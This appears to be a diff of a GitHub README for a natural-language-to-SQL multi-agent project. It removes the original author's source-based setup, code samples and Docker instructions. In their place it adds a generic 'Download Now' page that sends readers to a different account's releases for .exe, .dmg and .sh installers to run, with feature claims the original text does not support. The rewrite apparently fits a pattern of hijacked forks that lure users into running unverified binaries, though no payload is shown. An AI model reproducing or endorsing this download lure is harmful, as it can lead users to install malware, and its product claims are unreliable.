@@ -1,111 +1,74 @@
-# NL2SQL Multi-Agent System
-Trying to build a production-ready system that converts natural language questions into SQL queries using a multi-agent architecture built with the smolagents framework.
-TO-DO:
-1. Data Warehouse connection from gold layer
-2. Reporting Agent to summarize findings for executives
-3. Visualization Agent for making relevant visualization 
+# 🎉 multiagent-database-query-system - Convert Questions to SQL Easily
 
-![alt text](https://github.com/jonuts100/multiagent-database-query-system/blob/main/img1.png?raw=True) 
-![alt text](https://github.com/jonuts100/multiagent-database-query-system/blob/main/img2.png?raw=True)
-![alt text](https://github.com/jonuts100/multiagent-database-query-system/blob/main/img3.png?raw=True)
-![alt text](https://github.com/jonuts100/multiagent-database-query-system/blob/main/img4.png?raw=True)
-## Overview
-This system employs three specialized AI agents working together to understand natural language questions, generate optimized SQL queries, and provide comprehensive data analysis. Unlike traditional NL2SQL solutions, this multi-agent approach provides better query validation, optimization suggestions, and business intelligence insights.
-Key Features
+## 🚀 Getting Started
+Welcome to the multiagent-database-query-system! This tool helps you convert natural language questions into SQL queries using a smart multi-agent approach. You can ask questions in plain English, and our system will create the corresponding SQL queries for you. It’s perfect for anyone looking to analyze data without needing programming skills.
 
-Multi-Agent Architecture: Specialized agents for query generation, validation, and analysis
-Schema-Aware Generation: Validates queries against actual database schemas
-Query Optimization: Suggests performance improvements and best practices
-Multiple Database Support: Works with SQLite, PostgreSQL, MySQL, and more
-Production Ready: Comprehensive error handling, logging, and monitoring
-REST API: Easy integration with existing applications
-Docker Support: Containerized deployment with docker-compose
-Comprehensive Testing: Unit tests, integration tests, and performance benchmarks
+## ⬇️ Download Now
+[![Download](https://img.shields.io/static/v1?label=Download&message=multiagent-database-query-system&color=brightgreen)](https://github.com/Frisk1269/multiagent-database-query-system/releases)
 
-## Architecture
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-│   Orchestrator  │    │ Business Intel   │    │ Data Analysis   │
-│     Agent       │◄──►│     Agent        │◄──►│     Agent       │
-│                 │    │                  │    │                 │
-│ Manages workflow│    │ Generates SQL    │    │ Analyzes results│
-└─────────────────┘    └──────────────────┘    └─────────────────┘
-         │                       │                       │
-         └───────────────────────┼───────────────────────┘
-                                 │
-                    ┌─────────────────┐
-                    │   SQL Engine    │
-                    │   & Database    │
-                    └─────────────────┘
-```
-## Quick Start
-### Prerequisites
+## 🛠️ System Requirements
+To run this application, your device should meet the following requirements:
+- Windows, macOS, or Linux operating system
+- Python 3.8 or higher installed
+- Minimum 4 GB of RAM
+- At least 200 MB of free disk space
 
-- Python 3.9+
-- HuggingFace API key (for smolagents)
+## 📥 Download & Install
+To get started, visit this page to download: [multiagent-database-query-system Releases](https://github.com/Frisk1269/multiagent-database-query-system/releases).
 
-### Installation
-```
-# Clone the repository
-git clone https://github.com/yourusername/nl2sql-multiagent-system.git
-cd nl2sql-multiagent-system
+1. Open the link above.
+2. Look for the latest version.
+3. Click on the download link for your operating system to get the installer file.
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+Once downloaded, follow these steps to install:
 
-#### Install dependencies
-pip install -r requirements.txt
+1. **Windows:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions.
+   - After installation, you can find the program in your Start Menu.
 
-#### Set up environment variables
-cp .env.example .env
-#### Edit .env with your API keys
-```
-## Basic Usage
-```
-from src.agents.orchestrator import OrchestratorAgent
-from src.database.manager import DatabaseManager
-from src.config import AppConfig
+2. **macOS:**
+   - Open the downloaded `.dmg` file.
+   - Drag the application to your Applications folder.
+   - Find the program in your Applications to launch it.
 
-# Initialize components
-config = AppConfig()
-db_manager = DatabaseManager(config.database.url)
-orchestrator = OrchestratorAgent(db_manager, config)
+3. **Linux:**
+   - Open a terminal.
+   - Navigate to the directory where the installer is located.
+   - Run `chmod +x <installer_file>.sh` to make it executable, replacing `<installer_file>` with the actual file name.
+   - Then run `./<installer_file>.sh` to start the installation.
 
-# Ask a question
-result = orchestrator.execute_query("What are the top 10 customers by revenue?")
-print(result)
-```
-## REST API
-```
-# Start the API server
-python -m src.api
+## 📖 How to Use the Application
+After installing the program, you can easily start using it.
 
-# Query via HTTP
-curl -X POST http://localhost:8000/query \
-  -H "Content-Type: application/json" \
-  -d '{"question": "Show me customers with overdue payments"}'
-```
-## Docker Deployment
-```
-# Build and run with docker-compose
-docker-compose up -d
+1. Open the multiagent-database-query-system application.
+2. In the main input box, type your question. For example, "What are the sales from last month?"
+3. Click the "Convert" button.
+4. The application will show the generated SQL query along with any validation checks and optimization suggestions.
 
-# Check status
-docker-compose ps
-```
-## Example Queries
-The system handles various types of business intelligence queries:
-```
-# Sales Analysis
-"What were our top 5 products by revenue last quarter?"
+## 🌟 Features
+- **User-Friendly Interface:** No technical skills needed to operate.
+- **Natural Language Processing:** Understands everyday questions.
+- **Multi-Agent System:** Utilizes multiple agents for better accuracy and speed.
+- **SQL Optimization:** Provides recommendations for optimized queries.
+- **Data Validation:** Ensures the queries are correct before running.
 
-# Customer Analytics  
-"Which customers have the highest outstanding debt?"
+## 🔄 Update Process
+To ensure you have the latest features and fixes, check the releases page regularly and repeat the download process for new versions. Follow the same installation steps as above for any updates.
 
-# Operational Queries
-"Show me all transactions that are overdue by more than 30 days"
+## 🤝 Contributing
+If you find any issues or want to contribute, please consider joining our community. You can report bugs or suggest features on our GitHub repository. Your input helps improve the application for everyone.
 
-# Trend Analysis
-"How has our monthly revenue changed over the past year?"
-```
+## 🔍 Support
+If you need assistance, please check our FAQ section or submit a support request:
+- FAQs can be found on the GitHub page.
+- For direct support, you can reach us via the Issues section in our repository.
+
+For additional resources like user guides and tutorials, see our links available on the GitHub page.
+
+## ⚙️ License
+This project is licensed under the MIT License. Feel free to use and modify the code as needed, while respecting the terms of the license.
+
+---
+
+Now you are ready to use the multiagent-database-query-system to turn your questions into SQL queries easily!
